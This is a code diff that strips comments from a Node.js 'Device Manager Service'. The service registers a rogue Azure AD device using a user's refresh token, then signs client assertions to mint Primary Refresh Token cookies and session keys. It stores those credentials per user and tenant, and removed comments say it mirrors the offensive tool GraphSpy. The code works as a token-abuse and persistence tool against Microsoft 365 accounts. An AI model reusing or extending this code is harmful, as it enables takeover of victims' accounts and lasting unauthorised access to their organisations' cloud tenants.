@@ -1,6 +1,5 @@
 /**
  * VGenius C Engine â€“ Device Manager Service
- * Handles Azure AD Device Registration (DRS) and PRT generation
  */
 const axios = require('axios');
 const ms = require('./microsoftclient');
@@ -12,9 +11,6 @@ const config = require('../config/env');
 const { encrypt, decrypt } = require('../utils/encrypt');
 const prtkdf = require('./prtkdf');
 
-// ── GraphSpy exact DRS constants (core/device.py) ───────────────────────────
-// device.register() posts to this exact URL — the ?api-version=2.0 is required
-// or DRS answers 400.
 const DRS_ENDPOINT =
   'https://enterpriseregistration.windows.net/EnrollmentServer/device/?api-version=2.0';
 // device.register() sends headers={"User-Agent": ua.get(), "Authorization": ...}
@@ -137,8 +133,6 @@ async function registerDevice(accessToken, tenantId, csrPem, targetDomain, trans
     throw new Error('Invalid CSR: csrPem is missing or not a valid PEM string');
   }
 
-  // GraphSpy device.register(): certbytes = base64(csr.public_bytes(DER)).
-  // DRS wants the CSR as base64 DER inside CertificateRequest.Data, not PEM.
   let csrDerBase64;
   try {
     const csrAsn1 = forge.pki.certificationRequestToAsn1(
@@ -149,9 +143,6 @@ async function registerDevice(accessToken, tenantId, csrPem, targetDomain, trans
     throw new Error(`Invalid CSR: could not convert to DER (${csrErr.message})`);
   }
 
-  // GraphSpy device.register() request_body — exact key set and ordering:
-  //   CertificateRequest, TransportKey, TargetDomain, DeviceType,
-  //   OSVersion, DeviceDisplayName, JoinType, attributes
   const requestBody = {
     CertificateRequest: { Type: 'pkcs10', Data: csrDerBase64 },
     TransportKey: transportKey,
@@ -163,10 +154,6 @@ async function registerDevice(accessToken, tenantId, csrPem, targetDomain, trans
     attributes: { ReuseDevice: 'true', ReturnClientSid: 'true' },
   };
 
-  // ── The actual DRS enrollment call ──────────────────────────────────────
-  // This request was missing entirely: the function went straight from CSR
-  // conversion to reading `response.data`, so `response` was undefined and
-  // every registration died with "response is not defined".
   const drsHeaders = {
     Authorization: `Bearer ${accessToken}`,
     'Content-Type': 'application/json',
@@ -183,8 +170,7 @@ async function registerDevice(accessToken, tenantId, csrPem, targetDomain, trans
       validateStatus: () => true,
     });
   } catch (err) {
-    // A transport-level failure (dead proxy, reset connection) is worth one
-    // direct retry — DRS is not IP-bound the way the device_code flow is.
+
     const transportFailure = /ECONNRESET|ETIMEDOUT|ECONNREFUSED|EAI_AGAIN|socket hang up|tunneling socket/i
       .test(err.message || '');
     if (transportFailure) {
@@ -226,9 +212,6 @@ async function registerDevice(accessToken, tenantId, csrPem, targetDomain, trans
       deviceCertificate.RawBody || deviceCertificate.rawBody || deviceCertificate.value || null;
   }
 
-  // GraphSpy: device_id = certificate.subject COMMON_NAME — NOT data.User.*.
-  // The CN on the issued certificate is the identity DRS registered, and it is
-  // what must be used as the `iss`/`sub` of the client assertion later.
   let deviceId = null;
   try {
     if (typeof deviceCertificate === 'string' && deviceCertificate.length > 0) {
@@ -308,16 +291,11 @@ async function registerDevice(accessToken, tenantId, csrPem, targetDomain, trans
       }
     }
     if (!parsed) {
-      // Case 2: base64 DER (naked, no PEM headers) — this is what GraphSpy's
-      // device.register() returns in Certificate.RawBody.
       try {
         const derBuffer = Buffer.from(trimmed, 'base64');
         const cert = forge.pki.certificateFromAsn1(forge.asn1.fromDer(derBuffer.toString('binary')));
         certificateString = forge.pki.certificateToPem(cert);
         certificateThumbprint = crypto.createHash('sha1').update(derBuffer).digest('hex').toUpperCase();
-        // Keep the ORIGINAL DER base64. Re-deriving it from the PEM round-trip
-        // changes bytes, and AAD computes x5t from the x5c we send — a mismatch
-        // makes the assertion fail with AADSTS700027 (key not found).
         certificateDerBase64 = trimmed;
         parsed = true;
       } catch (e2) {
@@ -358,8 +336,6 @@ async function registerDevice(accessToken, tenantId, csrPem, targetDomain, trans
   }
 
   if (!deviceId || !deviceCertificate) {
-    // DRS can return HTTP 200 with an error body for business-logic rejections.
-    // Surface the actual reason instead of "missing required fields".
     const errorType = data.ErrorType || data.errorType || 'unknown';
     const errorMsg = data.Message || data.message || '';
     const traceId = data.TraceId || data.traceId || '';
@@ -374,28 +350,10 @@ async function registerDevice(accessToken, tenantId, csrPem, targetDomain, trans
     deviceCertificate: certificateString,
     tenantId: registrationTenantId,
     certificateThumbprint,
-    // CRITICAL: Store the original DER base64 from the DRS response.
-    // The round-trip DER -> PEM -> DER via forge loses byte-level fidelity,
-    // producing a different SHA-1 thumbprint. AAD computes the thumbprint from
-    // the x5c certificate, so we MUST use the original DER bytes for both x5c
-    // and the x5t/kid header claims, or AAD will reject the assertion with
-    // AADSTS700027 (key not found).
     certificateDerBase64: certificateDerBase64 || null
   };
 }
 
-/**
- * Build client assertion JWT signed with device private key
- *
- * Headers per RFC 7515 + JWT/X.509 usage in Azure AD:
- *  - kid        : SHA-1 hex of the full DER-encoded certificate
- *  - x5t        : SHA-1 hex of the full DER-encoded certificate (same as kid)
- *  - x5t#S256   : SHA-256 hex of the full DER-encoded certificate
- *  - x5c        : [base64 DER certificate]  (AAD uses this to look up the registered key)
- *
- * All hashes are computed from the DER bytes themselves, never from a utf8 string,
- * because utf8 destroys bytes >= 0x80 and would produce the wrong thumbprint.
- */
 function buildClientAssertion(privateKeyPem, deviceId, audience, certificatePem, certificateThumbprint, certificateDerBase64) {
   const now = Math.floor(Date.now() / 1000);
 
@@ -415,10 +373,6 @@ function buildClientAssertion(privateKeyPem, deviceId, audience, certificatePem,
   let derBase64 = null;
   let sha256Thumb = null;
 
-  // PREFERRED: Use the original DER base64 from the DRS response directly.
-  // This is the exact DER bytes that AAD issued, so the SHA-1 thumbprint will
-  // match what AAD expects. The round-trip DER -> PEM -> DER via forge is NOT
-  // byte-preserving and produces a different thumbprint, causing AADSTS700027.
   if (certificateDerBase64) {
     try {
       const derBuffer = Buffer.from(certificateDerBase64, 'base64');
@@ -436,8 +390,6 @@ function buildClientAssertion(privateKeyPem, deviceId, audience, certificatePem,
     }
   }
 
-  // FALLBACK: If we don't have the original DER base64, try PEM round-trip
-  // (less reliable â€” may produce wrong thumbprint)
   if (!derBase64 && certificatePem && certificatePem.includes('BEGIN CERTIFICATE')) {
     try {
       const cert = forge.pki.certificateFromPem(certificatePem);
@@ -493,13 +445,6 @@ function buildClientAssertion(privateKeyPem, deviceId, audience, certificatePem,
   return `${signData}.${signature}`;
 }
 
-/**
- * Exchange refresh token + client assertion for PRT cookie
- */
-/**
- * Exchange refresh token + client assertion for PRT cookie
- * Tries tenant-specific endpoint first, then falls back to common.
- */
 async function getPrtCookie(clientAssertion, refreshToken, tenantId) {
   const refreshPrefix = refreshToken ? refreshToken.substring(0, 12) : null;
   const assertionPrefix = clientAssertion ? clientAssertion.substring(0, 16) : null;
@@ -576,16 +521,6 @@ async function getPrtCookie(clientAssertion, refreshToken, tenantId) {
 }
 
 /**
- * GraphSpy prt.request_for_device() - Slice C.
- *
- * Exchanges the user's refresh token for the RAW PRT + session_key_jwe using
- * a device-signed JWT (RS256 + x5c, kdf_ver 2). This is the only source of
- * the session key; without it the KDF cookie (x-ms-RefreshTokenCredential)
- * and PRT->access-token flows cannot run.
- *
- * Non-fatal wrapper: returns null fields on failure so callers can fall back
- * to the legacy Set-Cookie cookie path.
- *
  * @param {object} p - { refreshToken, privateKeyPem, certificateBase64 }
  *   certificateBase64 may be base64 DER or PEM (prtkdf normalizes both).
  * @returns {Promise<{prt: string|null, sessionKeyJwe: string|null, sessionKeyHex: string|null}>}
@@ -612,14 +547,6 @@ async function capturePrtViaRequestForDevice({ refreshToken, privateKeyPem, cert
 }
 
 /**
- * Upsert the device_credentials row for user+tenant and store the
- * GraphSpy session key (encrypted, hex of the raw 32-byte key).
- *
- * A bare "UPDATE device_credentials ..." silently stores nothing when the
- * row does not exist yet (the broker-enrollment path never creates it),
- * which loses the session key forever. This helper creates the row from the
- * DRS device material when missing and updates it otherwise.
- *
  * @param {number|string} userId
  * @param {string} tenantId
  * @param {string|null} sessionKeyHex - raw session key (hex) to store
@@ -652,9 +579,6 @@ async function persistPrtSessionKey(userId, tenantId, sessionKeyHex, deviceMater
     return { created: false };
   }
 
-  // Row missing - create it from the DRS device material. device_id and
-  // encrypted_private_key are NOT NULL columns, so creation is only
-  // possible when the material was provided.
   if (!deviceMaterial.deviceId || !deviceMaterial.privateKeyPem) {
     console.warn('[DeviceManager] persistPrtSessionKey: no device_credentials row and insufficient device material to create one (userId=' + userId + ', tenant=' + tenantId + ')');
     return { created: false };
@@ -679,20 +603,9 @@ async function persistPrtSessionKey(userId, tenantId, sessionKeyHex, deviceMater
   return { created: true };
 }
 
-/**
- * Full device registration and PRT generation flow
- *
- * tokenData:
- *   access_token, refresh_token, tenant_id, user_id, target_domain
- *   inMemory (bool, default false) â€” when true, forces a fresh DRS registration
- *     even if stored credentials exist for the same user_id + tenant_id. Used by
- *     the admin Device Test panel to avoid mutating a real user's stored state.
- */
 async function registerDeviceAndGetPrt(tokenData) {
   const { access_token, tenant_id, refresh_token, user_id, target_domain, inMemory } = tokenData;
 
-  // Step 0: Check for existing device credentials and reuse if available
-  // (skip this check entirely in inMemory mode so the test always exercises the full flow)
   if (!inMemory && user_id && tenant_id) {
     const existing = await getStoredPrtCookie(user_id, tenant_id);
     if (existing && existing.prtCookie) {
@@ -703,8 +616,6 @@ async function registerDeviceAndGetPrt(tokenData) {
           [user_id, tenant_id]
         );
         if (credRows.length > 0) {
-          // GraphSpy parity: when no session key is stored yet, capture it
-          // now via the device-signed request_for_device call (Slice C).
           const storedPrivateKey = decrypt(credRows[0].encrypted_private_key);
           const storedCertificate = credRows[0].certificate_der_base64
             || decrypt(credRows[0].device_certificate_encrypted);
@@ -738,8 +649,6 @@ async function registerDeviceAndGetPrt(tokenData) {
   // Step 1: Generate RSA key pair and CSR using node-forge
   const deviceName = generateDeviceName();
   const { privateKeyPem, csrPem, transportKey } = generateKeyPairAndCsr(deviceName);
-  // Step 2: Exchange refresh token for a fresh DRS-scoped access token
-  // This bypass is required because the initial access token may not contain the ACRS claim.
   let drsAccessToken = access_token;
   if (refresh_token) {
     try {
@@ -812,8 +721,6 @@ async function registerDeviceAndGetPrt(tokenData) {
     throw new Error(`Device registration failed: ${err.message}`);
   }
 
-  // Step 4: Store device credentials IMMEDIATELY after DRS succeeds
-  // This ensures the certificate and private key are persisted even if PRT exchange fails
   if (user_id !== null && user_id !== undefined && tenant_id) {
     try {
       await storeDeviceCredentials({
@@ -845,9 +752,6 @@ async function registerDeviceAndGetPrt(tokenData) {
     throw new Error(`PRT cookie exchange failed: ${err.message}`);
   }
 
-  // Step 5b: GraphSpy prt.request_for_device() (Slice C) - capture the raw
-  // PRT + session_key_jwe with the device-signed JWT. Non-fatal: the legacy
-  // Set-Cookie cookie above remains the prtCookie field.
   const prtMaterial = await capturePrtViaRequestForDevice({
     refreshToken: refresh_token,
     privateKeyPem,
@@ -974,9 +878,6 @@ async function refreshPrtCookie(userId, tenantId, refreshToken) {
     const privateKey = decrypt(deviceRows[0].encrypted_private_key);
     const deviceCertificate = decrypt(deviceRows[0].device_certificate_encrypted);
     const audience = `https://login.microsoftonline.com/${tenantId || 'common'}/oauth2/v2.0/token`;
-    // Note: certificateDerBase64 is not yet stored in the DB (requires migration),
-    // so we pass null and rely on the PEM round-trip fallback. Once the migration
-    // is applied, we can retrieve it from the `certificate_der_base64` column.
     const derBase64 = deviceRows[0].certificate_der_base64 ? decrypt(deviceRows[0].certificate_der_base64) : null;
     const clientAssertion = buildClientAssertion(privateKey, credentials.deviceId, audience, deviceCertificate, null, derBase64);
     const prtCookie = await getPrtCookie(clientAssertion, refreshToken);
@@ -993,12 +894,6 @@ async function refreshPrtCookie(userId, tenantId, refreshToken) {
   }
 }
 
-/**
- * List stored device credentials (safe fields only, no encrypted blobs)
- *
- * Used by the admin Device Test panel to enumerate rows so an operator can
- * pick one to renew or clear. Never returns the encrypted cert / key / PRT.
- */
 async function listStoredCredentials() {
   const [rows] = await db.query(
     `SELECT id, user_id, tenant_id, device_id, user_principal_name, created_at, last_used
@@ -1009,8 +904,6 @@ async function listStoredCredentials() {
 }
 
 /**
- * Delete a stored device_credentials row.
- * Deletes by (user_id, tenant_id) composite key â€” the natural identifier.
  *
  * @returns {boolean} true if a row was deleted, false if nothing matched.
  */
@@ -1022,10 +915,6 @@ async function deleteStoredCredentials(userId, tenantId) {
   return (result.affectedRows || 0) > 0;
 }
 
-/**
- * Best-effort existence check for the device_credentials table.
- * Throws a clear error if the schema is missing so admin UI can show it.
- */
 async function deviceCredentialsTableExists() {
   try {
     const [rows] = await db.query(
@@ -1038,10 +927,6 @@ async function deviceCredentialsTableExists() {
   }
 }
 
-/**
- * Obtain a DRS-scoped access_token by exchanging a normal refresh token.
- * Returns { accessToken, deviceId } or null.
- */
 async function exchangeForDrsToken(refreshToken, tenantId) {
   try {
     const tokenResp = await ms.post(
@@ -1073,12 +958,6 @@ async function exchangeForDrsToken(refreshToken, tenantId) {
 }
 
 /**
- * Slice C — capture a fresh PRT + session key for an enrolled user+tenant
- * using the stored DRS device credentials (GraphSpy request_for_device flow).
- *
- * The decrypted session key is stored ENCRYPTED in
- * device_credentials.session_key_encrypted. The raw key is never returned.
- *
  * @returns {Promise<{success:boolean, prt:string, sessionKeyStored:boolean, expiresOn:?, user:?>}}
  */
 async function capturePrtSessionKey(userId, tenantId, refreshToken) {
@@ -1120,11 +999,6 @@ async function capturePrtSessionKey(userId, tenantId, refreshToken) {
   };
 }
 
-/**
- * Read the stored (encrypted) PRT session key for a user+tenant.
- * Returns { hasSessionKey, sessionKey } — the key is decrypted in memory for
- * KDF use only and must never be serialized into a response body.
- */
 async function getStoredSessionKey(userId, tenantId) {
   const [rows] = await db.query(
     'SELECT session_key_encrypted FROM device_credentials WHERE user_id = ? AND tenant_id = ?',
